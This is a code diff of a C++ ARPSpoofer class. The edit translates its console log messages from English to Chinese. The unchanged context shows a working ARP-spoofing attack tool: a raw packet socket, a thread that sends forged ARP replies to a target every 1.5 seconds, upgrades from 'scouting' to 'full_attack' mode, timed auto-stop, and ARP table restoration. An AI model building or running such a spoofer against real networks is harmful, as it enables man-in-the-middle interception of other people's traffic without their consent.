@@ -21,25 +21,25 @@ ARPSpoofer::~ARPSpoofer() {
 }
 
 bool ARPSpoofer::initialize() {
-    std::cout << "[ARP Spoofer] Initializing on interface " << interface_ << std::endl;
+    std::cout << "[ARP Spoofer] 正在初始化接口 " << interface_ << std::endl;
     
     if (!create_raw_socket()) {
         return false;
     }
     
-    std::cout << "[ARP Spoofer] Initialized successfully" << std::endl;
+    std::cout << "[ARP Spoofer] 初始化成功" << std::endl;
     return true;
 }
 
 void ARPSpoofer::shutdown() {
-    std::cout << "[ARP Spoofer] Starting shutdown..." << std::endl;
+    std::cout << "[ARP Spoofer] 正在关闭..." << std::endl;
     
     // 停止所有活跃会话
     std::lock_guard<std::mutex> lock(sessions_mutex_);
     
     for (auto& [ip, session] : active_sessions_) {
         if (session && session->active) {
-            std::cout << "[ARP Spoofer] Stopping session for " << ip << std::endl;
+            std::cout << "[ARP Spoofer] 正在停止 " << ip << " 的会话" << std::endl;
             session->active = false;
             
             // ★【修复】★ 先停止定时器线程
@@ -48,9 +48,9 @@ void ARPSpoofer::shutdown() {
                 if (session->timer_thread && session->timer_thread->joinable()) {
                     try {
                         session->timer_thread->join();
-                        std::cout << "[ARP Spoofer] Timer thread joined for " << ip << std::endl;
+                        std::cout << "[ARP Spoofer] 定时器线程已加入 " << ip << std::endl;
                     } catch (const std::exception& e) {
-                        std::cout << "[ARP Spoofer] Timer thread join failed for " << ip << ": " << e.what() << std::endl;
+                        std::cout << "[ARP Spoofer] 定时器线程加入失败 " << ip << ": " << e.what() << std::endl;
                     }
                 }
                 session->timer_thread.reset(); // ★ 显式重置
@@ -60,9 +60,9 @@ void ARPSpoofer::shutdown() {
             if (session->spoof_thread && session->spoof_thread->joinable()) {
                 try {
                     session->spoof_thread->join();
-                    std::cout << "[ARP Spoofer] Spoof thread joined for " << ip << std::endl;
+                    std::cout << "[ARP Spoofer] 欺骗线程已加入 " << ip << std::endl;
                 } catch (const std::exception& e) {
-                    std::cout << "[ARP Spoofer] Spoof thread join failed for " << ip << ": " << e.what() << std::endl;
+                    std::cout << "[ARP Spoofer] 欺骗线程加入失败 " << ip << ": " << e.what() << std::endl;
                 }
             }
         }
@@ -75,7 +75,7 @@ void ARPSpoofer::shutdown() {
     {
         std::lock_guard<std::mutex> restore_lock(restore_mutex_);
         recently_restored_targets_.clear();
-        std::cout << "[ARP Spoofer] Cleared restore tracking set" << std::endl;
+        std::cout << "[ARP Spoofer] 清除恢复跟踪集合" << std::endl;
     }
     
     if (raw_socket_ >= 0) {
@@ -83,7 +83,7 @@ void ARPSpoofer::shutdown() {
         raw_socket_ = -1;
     }
     
-    std::cout << "[ARP Spoofer] Shutdown complete" << std::endl;
+    std::cout << "[ARP Spoofer] 关闭完成" << std::endl;
 }
 
 bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string& gateway_ip,
@@ -98,9 +98,9 @@ bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string&
         
         // ★【新功能】★ 如果是升级攻击（从scouting升级到full_attack）
         if (existing_session->attack_type == "scouting" && attack_type == "full_attack") {
-            std::cout << "[ARP Spoofer] Upgrading attack on " << target_ip 
-                      << " from " << existing_session->attack_type << " to " << attack_type 
-                      << " for " << duration_seconds << " seconds" << std::endl;
+            std::cout << "[ARP Spoofer] 正在升级 " << target_ip 
+                      << " 的攻击类型 从 " << existing_session->attack_type << " 到 " << attack_type 
+                      << " 持续 " << duration_seconds << " 秒" << std::endl;
             
             // 停止旧的定时器
             if (existing_session->timer_active) {
@@ -125,7 +125,7 @@ bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string&
             
             return true;
         } else {
-            std::cout << "[ARP Spoofer] Target " << target_ip << " already being spoofed" << std::endl;
+            std::cout << "[ARP Spoofer] 目标 " << target_ip << " 正在被欺骗中" << std::endl;
             return true;
         }
     }
@@ -160,10 +160,10 @@ bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string&
     active_sessions_[target_ip] = std::move(session);
     total_sessions_++;
     
-    std::cout << "[ARP Spoofer] Started " << attack_type << " spoofing " << target_ip 
+    std::cout << "[ARP Spoofer] 开始 " << attack_type << " 欺骗 " << target_ip 
               << " -> " << gateway_ip;
     if (duration_seconds > 0) {
-        std::cout << " for " << duration_seconds << " seconds";
+        std::cout << " 持续 " << duration_seconds << " 秒";
     }
     std::cout << std::endl;
     
@@ -182,7 +182,7 @@ bool ARPSpoofer::stop_spoofing(const std::string& target_ip) {
     auto& session = it->second;
     session->active = false;
     
-    std::cout << "[ARP Spoofer] Stopping spoofing for " << target_ip << std::endl;
+    std::cout << "[ARP Spoofer] 正在停止 " << target_ip << " 的欺骗" << std::endl;
     
     // ★【修复】★ 先停止定时器线程
     if (session->timer_active) {
@@ -190,9 +190,9 @@ bool ARPSpoofer::stop_spoofing(const std::string& target_ip) {
         if (session->timer_thread && session->timer_thread->joinable()) {
             try {
                 session->timer_thread->join();
-                std::cout << "[ARP Spoofer] Timer thread stopped for " << target_ip << std::endl;
+                std::cout << "[ARP Spoofer] 定时器线程已停止 " << target_ip << std::endl;
             } catch (const std::exception& e) {
-                std::cout << "[ARP Spoofer] Timer thread stop failed for " << target_ip << ": " << e.what() << std::endl;
+                std::cout << "[ARP Spoofer] 定时器线程停止失败 " << target_ip << ": " << e.what() << std::endl;
             }
         }
         session->timer_thread.reset(); // ★ 显式重置
@@ -202,14 +202,14 @@ bool ARPSpoofer::stop_spoofing(const std::string& target_ip) {
     if (session->spoof_thread && session->spoof_thread->joinable()) {
         try {
             session->spoof_thread->join();
-            std::cout << "[ARP Spoofer] Spoof thread stopped for " << target_ip << std::endl;
+            std::cout << "[ARP Spoofer] 欺骗线程已停止 " << target_ip << std::endl;
         } catch (const std::exception& e) {
-            std::cout << "[ARP Spoofer] Spoof thread stop failed for " << target_ip << ": " << e.what() << std::endl;
+            std::cout << "[ARP Spoofer] 欺骗线程停止失败 " << target_ip << ": " << e.what() << std::endl;
         }
     }
     
-    std::cout << "[ARP Spoofer] Stopped " << session->attack_type << " spoofing " << target_ip 
-              << " (sent " << session->packets_sent << " packets)" << std::endl;
+    std::cout << "[ARP Spoofer] 停止 " << session->attack_type << " 欺骗 " << target_ip 
+              << " (已发送 " << session->packets_sent << " 个数据包)" << std::endl;
     
     active_sessions_.erase(it);
     return true;
@@ -221,7 +221,7 @@ bool ARPSpoofer::restore_arp(const std::string& target_ip, const std::string& ga
     {
         std::lock_guard<std::mutex> lock(restore_mutex_);
         if (recently_restored_targets_.find(target_ip) != recently_restored_targets_.end()) {
-            std::cout << "[ARP Spoofer] ⚠️ ARP restore for " << target_ip << " already in progress, skipping duplicate" << std::endl;
+            std::cout << "[ARP Spoofer] ⚠️ ARP 恢复 " << target_ip << " 已在进行中，跳过重复操作" << std::endl;
             return true;  // 认为成功，避免重复日志
         }
         
@@ -229,7 +229,7 @@ bool ARPSpoofer::restore_arp(const std::string& target_ip, const std::string& ga
         recently_restored_targets_.insert(target_ip);
     }
     
-    std::cout << "[ARP Spoofer] Restoring ARP for " << target_ip << std::endl;
+    std::cout << "[ARP Spoofer] 正在恢复 " << target_ip << " 的ARP" << std::endl;
     
     // 发送正确的ARP回复包恢复目标的ARP表
     bool success = true;
@@ -264,7 +264,7 @@ bool ARPSpoofer::restore_arp(const std::string& target_ip, const std::string& ga
 bool ARPSpoofer::create_raw_socket() {
     raw_socket_ = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (raw_socket_ < 0) {
-        std::cerr << "[ARP Spoofer] Failed to create raw socket: " << strerror(errno) << std::endl;
+        std::cerr << "[ARP Spoofer] 创建原始套接字失败: " << strerror(errno) << std::endl;
         return false;
     }
     
@@ -274,7 +274,7 @@ bool ARPSpoofer::create_raw_socket() {
     strncpy(ifr.ifr_name, interface_.c_str(), IFNAMSIZ - 1);
     
     if (ioctl(raw_socket_, SIOCGIFINDEX, &ifr) < 0) {
-        std::cerr << "[ARP Spoofer] Failed to get interface index: " << strerror(errno) << std::endl;
+        std::cerr << "[ARP Spoofer] 获取接口索引失败: " << strerror(errno) << std::endl;
         close(raw_socket_);
         raw_socket_ = -1;
         return false;
@@ -287,7 +287,7 @@ bool ARPSpoofer::create_raw_socket() {
     addr.sll_ifindex = ifr.ifr_ifindex;
     
     if (bind(raw_socket_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-        std::cerr << "[ARP Spoofer] Failed to bind socket: " << strerror(errno) << std::endl;
+        std::cerr << "[ARP Spoofer] 绑定套接字失败: " << strerror(errno) << std::endl;
         close(raw_socket_);
         raw_socket_ = -1;
         return false;
@@ -341,7 +341,7 @@ bool ARPSpoofer::send_arp_packet(const std::string& src_ip, const std::string& s
     // 发送包
     ssize_t sent = send(raw_socket_, packet, sizeof(packet), 0);
     if (sent < 0) {
-        std::cerr << "[ARP Spoofer] Failed to send ARP packet: " << strerror(errno) << std::endl;
+        std::cerr << "[ARP Spoofer] 发送ARP数据包失败: " << strerror(errno) << std::endl;
         return false;
     }
     
@@ -350,7 +350,7 @@ bool ARPSpoofer::send_arp_packet(const std::string& src_ip, const std::string& s
 }
 
 void ARPSpoofer::spoof_thread_func(const std::string& target_ip) {
-    std::cout << "[ARP Spoofer] Spoof thread started for " << target_ip << std::endl;
+    std::cout << "[ARP Spoofer] 欺骗线程已为 " << target_ip << " 启动" << std::endl;
     
     SpoofSession* session = nullptr;
     {
@@ -362,14 +362,14 @@ void ARPSpoofer::spoof_thread_func(const std::string& target_ip) {
     }
     
     if (!session) {
-        std::cerr << "[ARP Spoofer] Session not found for " << target_ip << std::endl;
+        std::cerr << "[ARP Spoofer] 找不到会话 " << target_ip << std::endl;
         return;
     }
     
     // 获取本机MAC地址
     std::string local_mac = get_interface_mac();
     if (local_mac.empty()) {
-        std::cerr << "[ARP Spoofer] Failed to get interface MAC" << std::endl;
+        std::cerr << "[ARP Spoofer] 获取接口MAC地址失败" << std::endl;
         return;
     }
     
@@ -389,13 +389,13 @@ void ARPSpoofer::spoof_thread_func(const std::string& target_ip) {
         std::this_thread::sleep_for(std::chrono::milliseconds(1500));
     }
     
-    std::cout << "[ARP Spoofer] Spoof thread ended for " << target_ip << std::endl;
+    std::cout << "[ARP Spoofer] 欺骗线程已结束 " << target_ip << std::endl;
 }
 
 // ★【修改】★ 定时器线程函数，使用weak_ptr确保线程安全
 void ARPSpoofer::timer_thread_func(const std::string& target_ip, uint32_t duration_seconds, 
                                   std::weak_ptr<SpoofSession> session_weak_ptr) {
-    std::cout << "[ARP Spoofer] Timer started for " << target_ip << " - " << duration_seconds << " seconds" << std::endl;
+    std::cout << "[ARP Spoofer] 定时器已启动 " << target_ip << " - " << duration_seconds << " 秒" << std::endl;
     
     // 等待指定的时间，每秒检查一次是否被取消
     for (uint32_t elapsed = 0; elapsed < duration_seconds; elapsed++) {
@@ -405,18 +405,18 @@ void ARPSpoofer::timer_thread_func(const std::string& target_ip, uint32_t durati
         if (auto session_shared_ptr = session_weak_ptr.lock()) {
             // 如果提升成功，说明会话仍然存在
             if (!session_shared_ptr->timer_active) {
-                std::cout << "[ARP Spoofer] Timer cancelled for " << target_ip << " at " << elapsed << "s" << std::endl;
+                std::cout << "[ARP Spoofer] 定时器在 " << elapsed << "s 被取消 " << target_ip << std::endl;
                 return;
             }
         } else {
             // 如果提升失败，说明会话已被主线程销毁，定时器线程应立即安全退出
-            std::cout << "[ARP Spoofer] Timer exits as session is already destroyed for " << target_ip << std::endl;
+            std::cout << "[ARP Spoofer] 定时器退出，因会话已被销毁 " << target_ip << std::endl;
             return;
         }
     }
     
     // 定时器到期，自动停止攻击并恢复网络
-    std::cout << "[ARP Spoofer] Timer expired for " << target_ip << " - auto-stopping attack" << std::endl;
+    std::cout << "[ARP Spoofer] 定时器到期 " << target_ip << " - 正在自动停止攻击" << std::endl;
     
     // ★【修复死锁】★ 获取恢复网络所需的信息，但不直接调用stop_spoofing（避免死锁）
     std::string gateway_ip, target_mac, gateway_mac;
@@ -432,9 +432,9 @@ void ARPSpoofer::timer_thread_func(const std::string& target_ip, uint32_t durati
         session_shared_ptr->active = false;
         session_shared_ptr->timer_active = false;
         
-        std::cout << "[ARP Spoofer] Session " << target_ip << " marked for termination by timer" << std::endl;
+        std::cout << "[ARP Spoofer] 会话 " << target_ip << " 被定时器标记为终止" << std::endl;
     } else {
-        std::cout << "[ARP Spoofer] Session destroyed before timer completion for " << target_ip << std::endl;
+        std::cout << "[ARP Spoofer] 会话在定时器完成前被销毁 " << target_ip << std::endl;
         return;
     }
     
@@ -444,12 +444,12 @@ void ARPSpoofer::timer_thread_func(const std::string& target_ip, uint32_t durati
     // 恢复网络（不需要锁，因为只使用本地变量）
     if (should_restore && !gateway_ip.empty()) {
         restore_arp(target_ip, gateway_ip, target_mac, gateway_mac);
-        std::cout << "[ARP Spoofer] ⏰ Auto-restored network for " << target_ip << " after timeout" << std::endl;
+        std::cout << "[ARP Spoofer] ⏰ 自动恢复网络 " << target_ip << " 超时后" << std::endl;
     }
     
     // ★【新增】★ 通知主程序清理该会话（通过一个安全的方式）
     // 这里可以使用事件队列或其他机制，但现在先简化处理
-    std::cout << "[ARP Spoofer] Timer thread completed for " << target_ip << std::endl;
+    std::cout << "[ARP Spoofer] 定时器线程已完成 " << target_ip << std::endl;
 }
 
 std::string ARPSpoofer::get_interface_mac() {
